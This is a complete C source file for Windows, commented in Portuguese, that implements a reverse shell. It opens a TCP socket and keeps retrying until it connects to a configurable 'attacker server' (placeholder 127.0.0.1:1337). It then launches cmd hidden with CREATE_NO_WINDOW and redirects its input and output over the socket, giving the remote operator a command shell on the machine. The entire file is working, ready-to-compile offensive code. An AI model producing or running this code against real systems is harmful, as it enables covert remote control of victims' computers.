#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "Ws2_32.lib")

#define SERVER_ADDRESS "127.0.0.1"      /* COLOQUE O IP DO SERVIDOR AQUI */
#define SERVER_PORT (int) 1337          /* COLOQUE A PORTA DO SERVIDOR AQUI*/

SOCKET sSocket = INVALID_SOCKET;    /* CRIACAO DA VARIAVEL DO SOCKET. POR PADRAO INVALIDA */
struct sockaddr_in saAddress;       /* CRIACAO DA VARIAVEL DO ENDERECO DO SERVIDOR*/

int initializeWinsock();    /* FUNCAO RESPONSAVEL POR INICIALIZAR O WINDOWS SOCKETS */
int createSocket();         /* FUNCAO RESPONSAVEL POR CRIAR O SOCKET DE REDE */
int connectFunction();      /* FUNCAO RESPONSAVEL POR CONECTAR AO SERVIDOR ATACANTE */
int spawnShell();           /* FUNCAO RESPONSAVEL POR INICIAR O CMD E ENVIAR AO SERVIDOR ATACANTE */

int main(void)
{
    initializeWinsock();
    createSocket();
    connectFunction();
    spawnShell();
    return EXIT_SUCCESS;
};

int initializeWinsock()
{
    WSADATA wsaData;
    int iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); /* INICIALIZA WSA E CONVERTE A SAIDA PARA UM FORMATO MAIS LEGIVEL */
    if (iResult != 0)
    {
        printf("[-] ERRO: Falha ao inicializar o WSA. - %d\n", iResult);
        return EXIT_FAILURE;
    }
    printf("[+] WinSock foi inicializado\n");
    return EXIT_SUCCESS;
}

int createSocket()
{
    // DEFINICAO DO NOSSO SOCKET. POR SER UMA SHELL REVERSA NOSSO SOCKET SERA DO TIPO CLIENTE
    sSocket = WSASocketW
    (
        AF_INET,                    /* DEFINE COMO IPV4 */
        SOCK_STREAM,                /* DEFINE COMO SENDO UMA SOCK STREAM */
        IPPROTO_TCP,                /* DEFINE COMO SENDO PROTOCOLO TCP */
        NULL,                       /* DEFINE INFORMACOES ADICIONAIS SOBRE O PROTOCOLO */
        0,                          /* DEFINE UM SOCKET GROUP */
        0                           /* OPCOES EXTRAS NA DEFINICAO DO SOCKET*/
    );
    if (sSocket == INVALID_SOCKET)
    {
        printf("[-] ERRO: Falha ao definir o SOCKET. - %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    // CONVERTENDO O ENDERECO IP UM FORMATO VALIDO E ATRIBUINDO O IP A SAADRESS
    if(InetPton(AF_INET, _T(SERVER_ADDRESS), &saAddress.sin_addr) != 1)
    {
        printf("[-] ERRO: Falha ao converter o IP. - %d\n", GetLastError());
        closesocket(sSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }
    saAddress.sin_family = AF_INET;             /* DEFININDO COMO AF_INET IPV4*/
    saAddress.sin_port = htons(SERVER_PORT);    /* DEFINIDO A PORTA */

    printf("[+] Socket criado\n");
    return EXIT_SUCCESS;
}

int connectFunction()
{
    // LOOP ATE ESTABELECER CONEXAO COM O SERVIDOR
    do
    {
        printf("[.] Aguardando conexao...\n");
        Sleep(2000);    // AGUARDA 2 SEGUNDOS
    }
    while (connect(sSocket, (struct sockaddr*) &saAddress, sizeof(saAddress)) != 0);
    printf("[+] Conectado ao servidor.\n");
    return EXIT_SUCCESS;
}

int spawnShell()
{
    STARTUPINFOW siInfo;                         /* ESTRUTURA COM INFORMACOES DE INICIALIZACAO DE UM NOVO PROCESSO */
    memset(&siInfo, 0, sizeof(siInfo));         /* PREENCHE A ESTRUTURA SIINFO COM ZEROS POR BOAS PRATICAS */
    siInfo.cb = sizeof(siInfo);                 /* DEFINE O TAMANHO DA ESTRUTURA */
	siInfo.dwFlags = (STARTF_USESTDHANDLES);    /* DEFINE QUE DEVE SER UTILIZADO OS HANDLES DE ENTRADA E SAIDA DEFINIDOS */
	siInfo.hStdInput = (HANDLE)sSocket;         /* DEFINE O HANDLE DE ENTRADA COMO SENDO O SOCKET */
	siInfo.hStdOutput = (HANDLE)sSocket;        /* DEFINE O HANDLE DE SAIDA COMO SENDO O SOCKET */
	siInfo.hStdError = (HANDLE)sSocket;         /* DEFINE O HANDLE DE ERROS COMO SENDO O SOCKET */
	PROCESS_INFORMATION piInfo;                 /* PIINFO IRA RECEBER AS INFORMACOES DO PROCESSO CRIADO */

    wchar_t commandLine[] = L"cmd";             /* DEFOME A LINHA DE COMANDO QUE DEVERA SER EXECUTADA PELO PROCESSO FILHO. NO NOSSO CASO O CMD */

    CreateProcessW              /* CRIA DE FATO UM NOVO PROCESSO COM AS INFORMACOES FORNECIDAS */
    (
        NULL,                   /* DEFINE O NOME DO APLICATIVO */
		commandLine,            /* DEFINE O A LINHA DE COMANDO EXECUTADA NO NOVO PROCESSO */
		NULL,                   /* DEFINE ATRIBUTOS DE SEGURANCA DO PROCESSO. DEIXAMOS PADRAO */
		NULL,                   /* DEFINE ATRIBUTOS DE SEGURANCA DA THREAD. DEIXAMOS PADRAO */
		TRUE,                   /* DEFINE QUE O PROCESSO FILHO DEVE HERDAS ATRIBUTOS DO PROCESSO PAI */
		CREATE_NO_WINDOW,       /* INDICA QUE O PROCESSO FILHO NÃO DEVE CRIAR UMA JANELA VISIVEL AO USUARIO */
		NULL,                   /* CONFIGURA O AMBIENTE DO PROCESSO FILHO. COMO NULL ESTAMOS USANDO O MESMO DO PAI */
		NULL,                   /* DEFINE O AMBIENTE DE TRABALHO DO PROCESSO FILHO. COMO NULL ESTAMOS USANDO O MESMO DO PAI */
		&siInfo,                /* DEFINE ONDE ESTAO AS INFORMACOES SOBRE O PROCESSO QUE SERA CRIADO*/
		&piInfo                 /* DEFINE ONDE ESTAO AS INFORMACOES SOBRE O PROCESSO QUE SERA CRIADO*/
    );

	return EXIT_SUCCESS;
}